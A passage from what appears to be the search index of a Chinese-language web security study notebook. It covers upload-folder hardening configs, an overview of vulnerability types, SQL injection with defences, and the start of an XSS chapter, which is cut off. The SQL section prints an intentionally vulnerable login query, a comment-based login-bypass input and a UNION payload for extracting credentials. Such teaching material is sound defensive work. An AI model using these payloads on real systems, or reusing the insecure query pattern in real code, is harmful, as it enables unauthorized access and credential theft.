<li>\u4f7f\u7528CDN\u6216\u4e13\u7528\u5b58\u50a8\u670d\u52a1\uff1a\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u5b58\u50a8\u5728\u4e13\u95e8\u7684\u5b58\u50a8\u670d\u52a1\u4e2d</li> </ul> <p>Apache .htaccess\u793a\u4f8b\uff1a <pre><code>&lt;Directory /path/to/uploads&gt;\n    Options -ExecCGI\n    php_flag engine off\n    RemoveHandler .php .php3 .php4 .phtml .pl .py .jsp\n&lt;/Directory&gt;\n</code></pre></p> <p>Nginx\u914d\u7f6e\u793a\u4f8b\uff1a <pre><code>location /uploads/ {\n    types {}\n    default_type application/octet-stream;\n    # \u7981\u6b62\u6267\u884cPHP\u811a\u672c\n    if ($request_filename ~* \\.(php|pl|py|jsp|asp|sh|cgi)$) {\n        return 403;\n    }\n}\n</code></pre></p>"},{"location":"web-security/file-upload/#5_1","title":"5. \u8bbf\u95ee\u63a7\u5236","text":"<p>\u5b9e\u65bd\u4e25\u683c\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u786e\u4fdd\u53ea\u6709\u6388\u6743\u7528\u6237\u624d\u80fd\u4e0a\u4f20\u6587\u4ef6\uff0c\u5e76\u9650\u5236\u4e0a\u4f20\u6587\u4ef6\u7684\u8bbf\u95ee\u6743\u9650\u3002</p>"},{"location":"web-security/file-upload/#6","title":"6. \u4e0a\u4f20\u8fdb\u5ea6\u76d1\u63a7","text":"<p>\u76d1\u63a7\u6587\u4ef6\u4e0a\u4f20\u8fc7\u7a0b\uff0c\u68c0\u6d4b\u5f02\u5e38\u884c\u4e3a\uff0c\u5982\u4e0a\u4f20\u8d85\u5927\u6587\u4ef6\u6216\u9891\u7e41\u4e0a\u4f20\u3002</p>"},{"location":"web-security/file-upload/#_5","title":"\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u4f7f\u7528\u767d\u540d\u5355\u9a8c\u8bc1\uff1a\u53ea\u5141\u8bb8\u4e0a\u4f20\u5df2\u77e5\u5b89\u5168\u7684\u6587\u4ef6\u7c7b\u578b</li> <li>\u5b9e\u65bd\u591a\u5c42\u9a8c\u8bc1\uff1a\u7ed3\u5408\u6587\u4ef6\u6269\u5c55\u540d\u3001MIME\u7c7b\u578b\u548c\u6587\u4ef6\u5185\u5bb9\u9a8c\u8bc1</li> <li>\u5b89\u5168\u7684\u6587\u4ef6\u547d\u540d\uff1a\u4f7f\u7528\u968f\u673a\u751f\u6210\u7684\u6587\u4ef6\u540d</li> <li>\u9002\u5f53\u7684\u670d\u52a1\u5668\u914d\u7f6e\uff1a\u7981\u6b62\u5728\u4e0a\u4f20\u76ee\u5f55\u6267\u884c\u811a\u672c</li> <li>\u6587\u4ef6\u5927\u5c0f\u9650\u5236\uff1a\u8bbe\u7f6e\u5408\u7406\u7684\u6587\u4ef6\u5927\u5c0f\u9650\u5236</li> <li>\u65e5\u5fd7\u8bb0\u5f55\uff1a\u8bb0\u5f55\u6240\u6709\u6587\u4ef6\u4e0a\u4f20\u64cd\u4f5c\uff0c\u4fbf\u4e8e\u5ba1\u8ba1\u548c\u76d1\u63a7</li> </ol>"},{"location":"web-security/file-upload/#_6","title":"\u603b\u7ed3","text":"<p>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u4f46\u4e25\u91cd\u7684\u5b89\u5168\u95ee\u9898\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b9e\u65bd\u4e25\u683c\u7684\u9a8c\u8bc1\u3001\u5b89\u5168\u7684\u5b58\u50a8\u548c\u9002\u5f53\u7684\u670d\u52a1\u5668\u914d\u7f6e\u6765\u9632\u5fa1\u3002\u5728\u5f00\u53d1\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u65f6\uff0c\u5e94\u5f53\u59cb\u7ec8\u9075\u5faa\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5\uff0c\u5bf9\u6240\u6709\u53ef\u80fd\u7684\u653b\u51fb\u5411\u91cf\u4fdd\u6301\u8b66\u60d5\u3002</p>"},{"location":"web-security/overview/","title":"Web\u5b89\u5168\u6f0f\u6d1e\u6982\u8ff0","text":""},{"location":"web-security/overview/#web_1","title":"\u4ec0\u4e48\u662fWeb\u5b89\u5168\u6f0f\u6d1e\uff1f","text":"<p>Web\u5b89\u5168\u6f0f\u6d1e\u662f\u6307Web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u5229\u7528\u6765\u83b7\u53d6\u672a\u6388\u6743\u7684\u8bbf\u95ee\u6743\u9650\u3001\u7be1\u6539\u6570\u636e\u3001\u7834\u574f\u670d\u52a1\u6216\u6267\u884c\u5176\u4ed6\u6076\u610f\u64cd\u4f5c\u3002</p>"},{"location":"web-security/overview/#web_2","title":"\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\u7c7b\u578b","text":"<p>\u672c\u7b14\u8bb0\u5e93\u5c06\u8be6\u7ec6\u4ecb\u7ecd\u4ee5\u4e0b\u51e0\u7c7b\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\uff1a</p>"},{"location":"web-security/overview/#sql-sql-injection","title":"SQL\u6ce8\u5165 (SQL Injection)","text":"<p>\u653b\u51fb\u8005\u901a\u8fc7\u5728\u8f93\u5165\u5b57\u6bb5\u4e2d\u63d2\u5165\u6076\u610fSQL\u4ee3\u7801\uff0c\u64cd\u7eb5\u540e\u7aef\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u6cc4\u9732\u3001\u6570\u636e\u7be1\u6539\u751a\u81f3\u670d\u52a1\u5668\u63a7\u5236\u3002</p>"},{"location":"web-security/overview/#xss-cross-site-scripting","title":"\u8de8\u7ad9\u811a\u672c\u653b\u51fb (XSS - Cross-Site Scripting)","text":"<p>\u653b\u51fb\u8005\u5728Web\u9875\u9762\u4e2d\u6ce8\u5165\u6076\u610f\u811a\u672c\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u9762\u65f6\uff0c\u811a\u672c\u4f1a\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\uff0c\u53ef\u80fd\u5bfc\u81f4\u4f1a\u8bdd\u52ab\u6301\u3001\u6570\u636e\u76d7\u7a83\u7b49\u95ee\u9898\u3002</p>"},{"location":"web-security/overview/#csrf-cross-site-request-forgery","title":"\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (CSRF - Cross-Site Request Forgery)","text":"<p>\u653b\u51fb\u8005\u8bf1\u5bfc\u7528\u6237\u5728\u5df2\u8ba4\u8bc1\u7684Web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6267\u884c\u975e\u9884\u671f\u7684\u64cd\u4f5c\uff0c\u5229\u7528\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u6076\u610f\u8bf7\u6c42\u3002</p>"},{"location":"web-security/overview/#command-injection","title":"\u547d\u4ee4\u6ce8\u5165 (Command Injection)","text":"<p>\u653b\u51fb\u8005\u901a\u8fc7Web\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u53ef\u80fd\u5bfc\u81f4\u670d\u52a1\u5668\u5b8c\u5168\u88ab\u63a7\u5236\u3002</p>"},{"location":"web-security/overview/#_1","title":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\uff0c\u5982WebShell\uff0c\u4ece\u800c\u83b7\u53d6\u670d\u52a1\u5668\u8bbf\u95ee\u6743\u9650\u3002</p>"},{"location":"web-security/overview/#_2","title":"\u8ba4\u8bc1\u4e0e\u6388\u6743\u95ee\u9898","text":"<p>\u8ba4\u8bc1\u673a\u5236\u7f3a\u9677\u6216\u6388\u6743\u63a7\u5236\u4e0d\u5f53\u53ef\u80fd\u5bfc\u81f4\u672a\u6388\u6743\u8bbf\u95ee\u654f\u611f\u529f\u80fd\u6216\u6570\u636e\u3002</p>"},{"location":"web-security/overview/#web_3","title":"Web\u5b89\u5168\u7684\u91cd\u8981\u6027","text":"<p>\u968f\u7740Web\u5e94\u7528\u7a0b\u5e8f\u5728\u4f01\u4e1a\u548c\u4e2a\u4eba\u751f\u6d3b\u4e2d\u7684\u5e7f\u6cdb\u5e94\u7528\uff0cWeb\u5b89\u5168\u95ee\u9898\u65e5\u76ca\u7a81\u51fa\u3002\u5b89\u5168\u7684Web\u5e94\u7528\u7a0b\u5e8f\u8bbe\u8ba1\u4e0d\u4ec5\u80fd\u591f\u4fdd\u62a4\u7528\u6237\u6570\u636e\u5b89\u5168\uff0c\u8fd8\u80fd\u7ef4\u62a4\u4f01\u4e1a\u7684\u58f0\u8a89\u548c\u907f\u514d\u6cd5\u5f8b\u8d23\u4efb\u3002</p>"},{"location":"web-security/overview/#sdlc","title":"\u5b89\u5168\u5f00\u53d1\u751f\u547d\u5468\u671f (SDLC)","text":"<p>\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u96c6\u6210\u5b89\u5168\u8003\u8651\u662f\u9884\u9632Web\u5b89\u5168\u6f0f\u6d1e\u7684\u6700\u4f73\u5b9e\u8df5\u3002\u5b89\u5168\u5f00\u53d1\u751f\u547d\u5468\u671f\u5305\u62ec\uff1a</p> <ol> <li>\u9700\u6c42\u5206\u6790\u9636\u6bb5\uff1a\u8bc6\u522b\u5b89\u5168\u9700\u6c42\u548c\u5a01\u80c1\u6a21\u578b</li> <li>\u8bbe\u8ba1\u9636\u6bb5\uff1a\u8fdb\u884c\u5b89\u5168\u8bbe\u8ba1\u548c\u67b6\u6784\u8bc4\u5ba1</li> <li>\u5f00\u53d1\u9636\u6bb5\uff1a\u9075\u5faa\u5b89\u5168\u7f16\u7801\u89c4\u8303</li> <li>\u6d4b\u8bd5\u9636\u6bb5\uff1a\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\u548c\u6e17\u900f\u6d4b\u8bd5</li> <li>\u90e8\u7f72\u9636\u6bb5\uff1a\u5b89\u5168\u914d\u7f6e\u548c\u52a0\u56fa</li> <li>\u7ef4\u62a4\u9636\u6bb5\uff1a\u6301\u7eed\u76d1\u63a7\u548c\u6f0f\u6d1e\u4fee\u590d</li> </ol>"},{"location":"web-security/overview/#_3","title":"\u5b66\u4e60\u8d44\u6e90","text":"<ul> <li>OWASP Top 10\uff1aWeb\u5e94\u7528\u7a0b\u5e8f\u6700\u5173\u952e\u7684\u5b89\u5168\u98ce\u9669\u6e05\u5355</li> <li>CWE/SANS Top 25\uff1a\u6700\u5371\u9669\u7684\u8f6f\u4ef6\u9519\u8bef</li> <li>\u76f8\u5173\u5b89\u5168\u5de5\u5177\uff1aOWASP ZAP\u3001Burp Suite\u7b49\u6e17\u900f\u6d4b\u8bd5\u5de5\u5177</li> </ul> <p>\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u8be6\u7ec6\u63a2\u8ba8\u6bcf\u79cd\u5b89\u5168\u6f0f\u6d1e\u7684\u539f\u7406\u3001\u653b\u51fb\u65b9\u5f0f\u548c\u9632\u5fa1\u7b56\u7565\u3002</p>"},{"location":"web-security/sql-injection/","title":"SQL\u6ce8\u5165 (SQL Injection)","text":""},{"location":"web-security/sql-injection/#sql","title":"\u4ec0\u4e48\u662fSQL\u6ce8\u5165\uff1f","text":"<p>SQL\u6ce8\u5165\u662f\u4e00\u79cd\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5728\u7528\u6237\u8f93\u5165\u4e2d\u63d2\u5165\u6076\u610fSQL\u4ee3\u7801\uff0c\u4f7f\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u975e\u9884\u671f\u7684\u6570\u636e\u5e93\u64cd\u4f5c\u3002\u8fd9\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u6cc4\u9732\u3001\u6570\u636e\u7be1\u6539\u3001\u7ed5\u8fc7\u8ba4\u8bc1\u751a\u81f3\u670d\u52a1\u5668\u88ab\u63a5\u7ba1\u7b49\u4e25\u91cd\u540e\u679c\u3002</p>"},{"location":"web-security/sql-injection/#sql_1","title":"SQL\u6ce8\u5165\u7684\u5de5\u4f5c\u539f\u7406","text":"<p>\u5f53Web\u5e94\u7528\u7a0b\u5e8f\u76f4\u63a5\u5c06\u7528\u6237\u8f93\u5165\u62fc\u63a5\u5230SQL\u67e5\u8be2\u8bed\u53e5\u4e2d\uff0c\u800c\u6ca1\u6709\u8fdb\u884c\u9002\u5f53\u7684\u9a8c\u8bc1\u6216\u8f6c\u4e49\u65f6\uff0c\u5c31\u53ef\u80fd\u53d1\u751fSQL\u6ce8\u5165\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u4fee\u6539SQL\u67e5\u8be2\u7684\u903b\u8f91\uff0c\u6267\u884c\u81ea\u5df1\u60f3\u8981\u7684\u64cd\u4f5c\u3002</p>"},{"location":"web-security/sql-injection/#sql_2","title":"\u5e38\u89c1\u7684SQL\u6ce8\u5165\u7c7b\u578b","text":""},{"location":"web-security/sql-injection/#1-sql","title":"1. \u57fa\u4e8e\u9519\u8bef\u7684SQL\u6ce8\u5165","text":"<p>\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u8f93\u5165\uff0c\u4f7f\u5e94\u7528\u7a0b\u5e8f\u8fd4\u56de\u6570\u636e\u5e93\u9519\u8bef\u4fe1\u606f\uff0c\u4ece\u800c\u83b7\u53d6\u6570\u636e\u5e93\u7ed3\u6784\u7b49\u654f\u611f\u4fe1\u606f\u3002</p>"},{"location":"web-security/sql-injection/#2","title":"2. \u57fa\u4e8e\u5e03\u5c14\u7684\u76f2\u6ce8","text":"<p>\u653b\u51fb\u8005\u901a\u8fc7\u53d1\u9001\u4e0d\u540c\u7684\u67e5\u8be2\uff0c\u89c2\u5bdf\u5e94\u7528\u7a0b\u5e8f\u7684\u54cd\u5e94\uff08\u771f/\u5047\uff09\u6765\u63a8\u65ad\u6570\u636e\u5e93\u4e2d\u7684\u4fe1\u606f\u3002</p>"},{"location":"web-security/sql-injection/#3","title":"3. \u57fa\u4e8e\u65f6\u95f4\u7684\u76f2\u6ce8","text":"<p>\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u4f7f\u6570\u636e\u5e93\u6267\u884c\u5ef6\u8fdf\u7684\u67e5\u8be2\uff0c\u6839\u636e\u54cd\u5e94\u65f6\u95f4\u6765\u5224\u65ad\u67e5\u8be2\u7ed3\u679c\u3002</p>"},{"location":"web-security/sql-injection/#4","title":"4. \u5806\u53e0\u67e5\u8be2\u6ce8\u5165","text":"<p>\u653b\u51fb\u8005\u5728\u4e00\u4e2a\u8bf7\u6c42\u4e2d\u6267\u884c\u591a\u4e2aSQL\u8bed\u53e5\uff0c\u901a\u8fc7\u5206\u53f7(;)\u5206\u9694\u3002</p>"},{"location":"web-security/sql-injection/#sql_3","title":"SQL\u6ce8\u5165\u793a\u4f8b","text":""},{"location":"web-security/sql-injection/#_1","title":"\u7b80\u5355\u7684\u767b\u5f55\u7ed5\u8fc7","text":"<p>\u5047\u8bbe\u6709\u4ee5\u4e0b\u767b\u5f55\u9a8c\u8bc1\u4ee3\u7801\uff1a</p> <pre><code># \u4e0d\u5b89\u5168\u7684Python\u4ee3\u7801\u793a\u4f8b\nusername = request.form['username']\npassword = request.form['password']\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\ncursor.execute(query)\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u8f93\u5165\u7ed5\u8fc7\u767b\u5f55\uff1a - \u7528\u6237\u540d: <code>admin' --</code> - \u5bc6\u7801: \u4efb\u610f\u503c</p> <p>\u751f\u6210\u7684SQL\u5c06\u53d8\u6210\uff1a <pre><code>SELECT * FROM users WHERE username='admin' --' AND password='\u4efb\u610f\u503c'\n</code></pre></p> <p>\u7531\u4e8e<code>--</code>\u5728SQL\u4e2d\u8868\u793a\u6ce8\u91ca\uff0c\u540e\u9762\u7684\u6761\u4ef6\u88ab\u5ffd\u7565\uff0c\u53ea\u8981\u5b58\u5728\u7528\u6237\u540d\u4e3a'admin'\u7684\u7528\u6237\uff0c\u653b\u51fb\u8005\u5c31\u80fd\u6210\u529f\u767b\u5f55\u3002</p>"},{"location":"web-security/sql-injection/#_2","title":"\u6570\u636e\u63d0\u53d6\u793a\u4f8b","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528UNION\u67e5\u8be2\u6ce8\u5165\u6765\u63d0\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u5176\u4ed6\u4fe1\u606f\uff1a</p> <pre><code>' UNION SELECT username, password FROM users --\n</code></pre>"},{"location":"web-security/sql-injection/#sql_4","title":"SQL\u6ce8\u5165\u7684\u9632\u5fa1\u63aa\u65bd","text":""},{"location":"web-security/sql-injection/#1","title":"1. \u53c2\u6570\u5316\u67e5\u8be2\uff08\u9884\u7f16\u8bd1\u8bed\u53e5\uff09","text":"<p>\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\u662f\u9632\u5fa1SQL\u6ce8\u5165\u6700\u6709\u6548\u7684\u65b9\u6cd5\u4e4b\u4e00\u3002\u5728\u53c2\u6570\u5316\u67e5\u8be2\u4e2d\uff0cSQL\u8bed\u53e5\u7ed3\u6784\u548c\u6570\u636e\u662f\u5206\u5f00\u5904\u7406\u7684\u3002</p> <p>Python (\u4f7f\u7528psycopg2) \u793a\u4f8b\uff1a</p> <pre><code># \u5b89\u5168\u7684\u53c2\u6570\u5316\u67e5\u8be2\u793a\u4f8b\nquery = \"SELECT * FROM users WHERE username = %s AND password = %s\"\ncursor.execute(query, (username, password))  # \u53c2\u6570\u4f5c\u4e3a\u5143\u7ec4\u4f20\u9012\n</code></pre> <p>Node.js (\u4f7f\u7528mysql2) \u793a\u4f8b\uff1a</p> <pre><code>// \u5b89\u5168\u7684\u53c2\u6570\u5316\u67e5\u8be2\u793a\u4f8b\nconst [rows] = await connection.execute(\n  'SELECT * FROM users WHERE username = ? AND password = ?',\n  [username, password]\n);\n</code></pre>"},{"location":"web-security/sql-injection/#2-orm","title":"2. \u4f7f\u7528ORM\u6846\u67b6","text":"<p>ORM\uff08\u5bf9\u8c61\u5173\u7cfb\u6620\u5c04\uff09\u6846\u67b6\u901a\u5e38\u5185\u7f6e\u4e86\u9632SQL\u6ce8\u5165\u7684\u673a\u5236\uff0c\u5982Django ORM\u3001SQLAlchemy\u3001Hibernate\u7b49\u3002</p> <p>Django ORM\u793a\u4f8b\uff1a</p> <pre><code># \u5b89\u5168\u7684Django ORM\u67e5\u8be2\nuser = User.objects.filter(username=username, password=password).first()\n</code></pre>"},{"location":"web-security/sql-injection/#3_1","title":"3. \u8f93\u5165\u9a8c\u8bc1\u548c\u8fc7\u6ee4","text":"<p>\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u4e25\u683c\u7684\u9a8c\u8bc1\u548c\u8fc7\u6ee4\uff0c\u786e\u4fdd\u8f93\u5165\u7b26\u5408\u9884\u671f\u7684\u683c\u5f0f\u548c\u957f\u5ea6\u3002</p> <pre><code># \u7b80\u5355\u7684\u8f93\u5165\u9a8c\u8bc1\u793a\u4f8b\nimport re\n\ndef validate_input(input_str):\n    # \u53ea\u5141\u8bb8\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\n    if not re.match(r'^\\w+$', input_str):\n        raise ValueError(\"Invalid input format\")\n    return input_str\n</code></pre>"},{"location":"web-security/sql-injection/#4_1","title":"4. \u6700\u5c0f\u6743\u9650\u539f\u5219","text":"<p>\u6570\u636e\u5e93\u7528\u6237\u5e94\u8be5\u53ea\u88ab\u6388\u4e88\u5b8c\u6210\u5176\u5de5\u4f5c\u6240\u9700\u7684\u6700\u5c0f\u6743\u9650\uff0c\u907f\u514d\u4f7f\u7528\u5177\u6709\u9ad8\u6743\u9650\u7684\u6570\u636e\u5e93\u8d26\u6237\u3002</p>"},{"location":"web-security/sql-injection/#5","title":"5. \u4f7f\u7528\u5b58\u50a8\u8fc7\u7a0b","text":"<p>\u5408\u7406\u4f7f\u7528\u5b58\u50a8\u8fc7\u7a0b\u53ef\u4ee5\u51cf\u5c11SQL\u6ce8\u5165\u7684\u98ce\u9669\uff0c\u56e0\u4e3a\u5b58\u50a8\u8fc7\u7a0b\u7684\u53c2\u6570\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e49\u3002</p>"},{"location":"web-security/sql-injection/#6","title":"6. \u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26","text":"<p>\u5728\u65e0\u6cd5\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\uff0c\u4f46\u8fd9\u4e0d\u662f\u6700\u5b89\u5168\u7684\u65b9\u6cd5\u3002</p> <pre><code># \u4f7f\u7528\u8fde\u63a5\u6c60\u7684\u8f6c\u4e49\u529f\u80fd\nusername_escaped = connection.escape_string(username)\npassword_escaped = connection.escape_string(password)\nquery = f\"SELECT * FROM users WHERE username='{username_escaped}' AND password='{password_escaped}'\"\n</code></pre>"},{"location":"web-security/sql-injection/#_3","title":"\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u6c38\u8fdc\u4e0d\u8981\u4fe1\u4efb\u7528\u6237\u8f93\u5165\uff1a\u5bf9\u6240\u6709\u7528\u6237\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1\u548c\u6e05\u7406</li> <li>\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\uff1a\u59cb\u7ec8\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\u62fc\u63a5</li> <li>\u5b9e\u73b0\u8f93\u5165\u957f\u5ea6\u9650\u5236\uff1a\u9650\u5236\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u51cf\u5c11\u653b\u51fb\u9762</li> <li>\u4f7f\u7528\u767d\u540d\u5355\u8fc7\u6ee4\uff1a\u57fa\u4e8e\u767d\u540d\u5355\u9a8c\u8bc1\u8f93\u5165\uff0c\u800c\u4e0d\u662f\u9ed1\u540d\u5355</li> <li>\u5bf9\u6570\u636e\u5e93\u9519\u8bef\u8fdb\u884c\u5904\u7406\uff1a\u907f\u514d\u5411\u7528\u6237\u663e\u793a\u8be6\u7ec6\u7684\u6570\u636e\u5e93\u9519\u8bef\u4fe1\u606f</li> <li>\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff1a\u4f7f\u7528\u5de5\u5177\u5982SQLmap\u8fdb\u884cSQL\u6ce8\u5165\u6d4b\u8bd5</li> </ol>"},{"location":"web-security/sql-injection/#_4","title":"\u603b\u7ed3","text":"<p>SQL\u6ce8\u5165\u662f\u4e00\u79cd\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u4f46\u901a\u8fc7\u91c7\u7528\u9002\u5f53\u7684\u9632\u5fa1\u63aa\u65bd\uff0c\u7279\u522b\u662f\u4f7f\u7528\u53c2\u6570\u5316\u67e5\u8be2\u548cORM\u6846\u67b6\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u9632\u6b62\u5927\u591a\u6570SQL\u6ce8\u5165\u653b\u51fb\u3002\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\uff0c\u9075\u5faa\u5b89\u5168\u7f16\u7801\u89c4\u8303\uff0c\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\u662f\u786e\u4fdd\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7684\u5173\u952e\u3002</p>"},{"location":"web-security/xss/","title":"XSS\u8de8\u7ad9\u811a\u672c\u653b\u51fb (Cross-Site Scripting)","text":""},{"location":"web-security/xss/#xss","title":"\u4ec0\u4e48\u662fXSS\uff1f","text":"<p>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross-Site Scripting\uff0c\u7b80\u79f0XSS\uff09\u662f\u4e00\u79cd\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5728Web\u9875\u9762\u4e2d\u6ce8\u5165\u6076\u610f\u811a\u672c\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8be5\u9875\u9762\u65f6\uff0c\u811a\u672c\u4f1a\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u8fd9\u53ef\u80fd\u5bfc\u81f4\u4f1a\u8bdd\u52ab\u6301\u3001\u6570\u636e\u76d7\u7a83\u3001\u7f51\u7ad9\u7be1\u6539\u7b49\u4e25\u91cd\u540e\u679c\u3002</p>"},{"location":"web-security/xss/#xss_1","title":"XSS\u7684\u5de5\u4f5c\u539f\u7406","text":"<p>XSS\u653b\u51fb\u53d1\u751f\u5728Web\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u9a8c\u8bc1\u6216\u8f6c\u4e49\u7528\u6237\u8f93\u5165\u7684\u60c5\u51b5\u4e0b\u3002\u653b\u51fb\u8005\u5c06\u6076\u610fJavaScript\u4ee3\u7801\u6ce8\u5165\u5230\u9875\u9762\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u5305\u542b\u8fd9\u4e9b\u4ee3\u7801\u7684\u9875\u9762\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u6267\u884c\u8fd9\u4e9b\u4ee3\u7801\uff0c\u5c31\u50cf\u5b83\u4eec\u662f\u9875\u9762\u7684\u5408\u6cd5\u7ec4\u6210\u90e8\u5206\u4e00\u6837\u3002</p>"},{"location":"web-security/xss/#xss_2","title":"XSS\u7684\u4e09\u79cd\u4e3b\u8981\u7c7b\u578b","text":""},{"location":"web-security/xss/#1-xss-stored-xss","title":"1. \u5b58\u50a8\u578bXSS (Stored XSS)","text":"<p>\u7279\u70b9\uff1a\u6076\u610f\u811a\u672c\u88ab\u6c38\u4e45\u5b58\u50a8\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\uff08\u5982\u6570\u636e\u5e93\u3001\u7559\u8a00\u677f\u3001\u8bc4\u8bba\u533a\u7b49\uff09\u3002</p> <p>\u653b\u51fb\u6d41\u7a0b\uff1a 1. \u653b\u51fb\u8005\u5c06\u6076\u610f\u811a\u672c\u63d0\u4ea4\u5230\u76ee\u6807\u7f51\u7ad9\u7684\u6570\u636e\u5e93\u4e2d 2. \u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u5305\u542b\u6076\u610f\u811a\u672c\u7684\u9875\u9762 3. \u6076\u610f\u811a\u672c\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c</p> <p>\u5f71\u54cd\u8303\u56f4\uff1a\u5f71\u54cd\u6240\u6709\u8bbf\u95ee\u8be5\u9875\u9762\u7684\u7528\u6237\uff0c\u5371\u5bb3\u8f83\u5927\u3002</p> <p>\u5178\u578b\u573a\u666f\uff1a\u8bba\u575b\u8bc4\u8bba\u3001\u7528\u6237\u8d44\u6599\u3001\u535a\u5ba2\u6587\u7ae0\u7b49\u7528\u6237\u53ef\u63d0\u4ea4\u5185\u5bb9\u7684\u5730\u65b9\u3002</p>"},{"location":"web-security/xss/#2-xss-reflected-xss","title":"2. \u53cd\u5c04\u578bXSS (Reflected XSS)","text":"<p>\u7279\u70b9\uff1a\u6076\u610f\u811a\u672c\u5305\u542b\u5728URL\u4e2d\uff0c\u5f53\u7528\u6237\u70b9\u51fb\u7279\u5236\u7684URL\u65f6\uff0c\u811a\u672c\u88ab\u53cd\u5c04\u5230\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002</p> <p>\u653b\u51fb\u6d41\u7a0b\uff1a 1. \u653b\u51fb\u8005\u6784\u9020\u5305\u542b\u6076\u610f\u811a\u672c\u7684URL 2. \u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\u8be5URL 3. \u5f53\u7528\u6237\u8bbf\u95eeURL\u65f6\uff0c\u6076\u610f\u811a\u672c\u88ab\u53cd\u5c04\u5230\u6d4f\u89c8\u5668\u5e76\u6267\u884c</p> <p>\u5f71\u54cd\u8303\u56f4\uff1a\u901a\u5e38\u53ea\u5f71\u54cd\u70b9\u51fb\u94fe\u63a5\u7684\u7279\u5b9a\u7528\u6237\u3002</p> <p>\u5178\u578b\u573a\u666f\uff1a\u641c\u7d22\u9875\u9762\u3001\u9519\u8bef\u9875\u9762\u3001URL\u53c2\u6570\u76f4\u63a5\u663e\u793a\u5728\u9875\u9762\u7684\u5730\u65b9\u3002</p>"},{"location":"web-security/xss/#3-domxss-dom-based-xss","title":"3. DOM\u578bXSS (DOM-based 